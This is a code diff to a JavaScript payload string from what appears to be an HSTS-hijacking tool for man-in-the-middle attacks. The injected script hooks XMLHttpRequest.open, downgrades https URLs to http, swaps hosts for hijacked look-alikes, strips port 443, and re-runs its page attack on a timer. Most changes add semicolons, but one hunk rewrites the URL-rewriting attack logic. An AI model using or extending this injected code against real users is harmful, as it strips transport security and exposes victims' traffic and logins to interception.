@@ -10,38 +10,38 @@ var payload,
     	"	self.{{SESSION_ID_TAG}} = function() {\n" + 
     	"		var obf_var_callback_log_121737 = [];\n" + 
     	"		function obf_func_toWholeRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
-    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
-    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\-/g, \"\\\\-\")\n" + 
+    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\");\n" + 
+    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\-/g, \"\\\\-\");\n" + 
     	"			return [\n" + 
     	"				new RegExp(\"^\" + obf_var_selector_string_121737 + \"$\", \"ig\"),\n" + 
     	"				obf_var_replacement_string_121737\n" + 
-    	"			]\n" + 
+    	"			];\n" + 
     	"		}\n" + 
     	"		function obf_func_toWholeWildcardRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
-    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\-/g, \"\\\\-\")\n" + 
+    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\-/g, \"\\\\-\");\n" + 
     	"			if ( obf_var_selector_string_121737.match(/^\\*./) ) {\n" + 
-    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/^\\*\\./, \"((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)\")\n" + 
-    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
-    	"				obf_var_replacement_string_121737 = obf_var_replacement_string_121737.replace(/^\\*\\./, \"\")\n" + 
+    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/^\\*\\./, \"((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)\");\n" + 
+    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\");\n" + 
+    	"				obf_var_replacement_string_121737 = obf_var_replacement_string_121737.replace(/^\\*\\./, \"\");\n" + 
     	"				return [\n" + 
     	"					new RegExp(\"^\" + obf_var_selector_string_121737 + \"$\", \"ig\"),\n" + 
     	"					\"$1\" + obf_var_replacement_string_121737\n" + 
-    	"				]\n" + 
+    	"				];\n" + 
     	"			} else if ( obf_var_selector_string_121737.match(/\\.\\*$/) ) {\n" + 
-    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\.\\*/g, \"((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)\")\n" + 
-    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
-    	"				obf_var_replacement_string_121737 = obf_var_replacement_string_121737.replace(/\\.\\*$/, \"\")\n" + 
+    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\.\\*/g, \"((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)\");\n" + 
+    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\");\n" + 
+    	"				obf_var_replacement_string_121737 = obf_var_replacement_string_121737.replace(/\\.\\*$/, \"\");\n" + 
     	"				return [\n" + 
     	"					new RegExp(obf_var_selector_string_121737, \"ig\"),\n" + 
     	"					obf_var_replacement_string_121737 + \"$1\"\n" + 
-    	"				]\n" + 
+    	"				];\n" + 
     	"			}\n" + 
     	"		}\n" + 
     	"		function obf_func_toWholeRegexpSet_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
     	"			if ( obf_var_selector_string_121737.indexOf(\"*\") != -1 ) {\n" + 
-    	"				return obf_func_toWholeWildcardRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737)			\n" + 
+    	"				return obf_func_toWholeWildcardRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737);\n" + 
     	"			} else {\n" + 
-    	"				return obf_func_toWholeRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737)\n" + 
+    	"				return obf_func_toWholeRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737);\n" + 
     	"			}\n" + 
     	"		}\n" + 
     	"		{{VARIABLES_TAG}}\n" + 
@@ -58,9 +58,10 @@ var payload,
     	"		function obf_func_attack_XMLHttpRequest_121737() {\n" + 
     	"			var obf_func_open_121737 = XMLHttpRequest.prototype.open;\n" + 
     	"			XMLHttpRequest.prototype.open = function(obf_var_method_121737, obf_var_url_121737, obf_var_async_121737, obf_var_username_121737, obf_var_password_121737) {\n" + 
-    	"				obf_var_host_121737 = obf_func_hstshijack_121737(obf_var_url_121737.replace(/^http[s]?:\\/\\/([^:/?#]+).*$/i, \"$1\"));\n" + 
-    	"				obf_var_path_121737 = obf_var_url_121737.replace(/^(?:http[s]?:\\/\\/[^:/?#]*)?([:/?#].*$)/, \"$1\");\n" + 
-    	"				obf_var_url_121737 = \"http://\" + obf_var_host_121737 + obf_var_path_121737;\n" + 
+        "               obf_var_host_121737 = obf_var_url_121737.replace(/^(?:[a-z]+:\\/\\/)?([^:/?#]*).*/i, \"$1\");\n" + 
+        "               obf_var_hijacked_host_121737 = obf_func_hstshijack_121737(obf_var_host_121737);\n" + 
+    	"				obf_var_path_121737 = obf_var_url_121737.replace(/(?:[a-z]+:\\/\\/)?.*([:/?#].*)/i, \"$1\");\n" + 
+    	"				obf_var_url_121737 = obf_var_url_121737.replace(/^(http)s:\\/\\//i, \"$1://\").replace(obf_var_host_121737, obf_var_hijacked_host_121737).replace(/:443([^0-9]|$)/, \"$1\");\n" + 
     	"				return obf_func_open_121737.apply(this, arguments);\n" + 
     	"			}\n" + 
     	"		}\n" + 
@@ -103,14 +104,15 @@ var payload,
     	"				});\n" + 
     	"			} catch(obf_var_ignore_121737){}\n" + 
     	"		}\n" + 
-        "		obf_func_attack_XMLHttpRequest_121737();\n" + 
     	"		setInterval(function(){\n" + 
     	"			obf_func_attack_121737();\n" + 
     	"		}, 666);\n" + 
     	"		try {\n" + 
     	"			document.addEventListener(\"DOMContentLoaded\", obf_func_attack_121737);\n" + 
-    	"		} catch(obf_var_ignore_121737){\n" + 
+        "           obf_func_attack_XMLHttpRequest_121737();\n" + 
+    	"		} catch(obf_var_ignore_121737) {\n" + 
     	"			self.addEventListener(\"load\", obf_func_attack_121737);\n" + 
+    	"			self.addEventListener(\"load\", obf_func_attack_XMLHttpRequest_121737);\n" + 
     	"		}\n" + 
     	"		obf_func_attack_121737();\n" + 
     	"		{{CUSTOM_PAYLOAD_TAG}}\n" + 
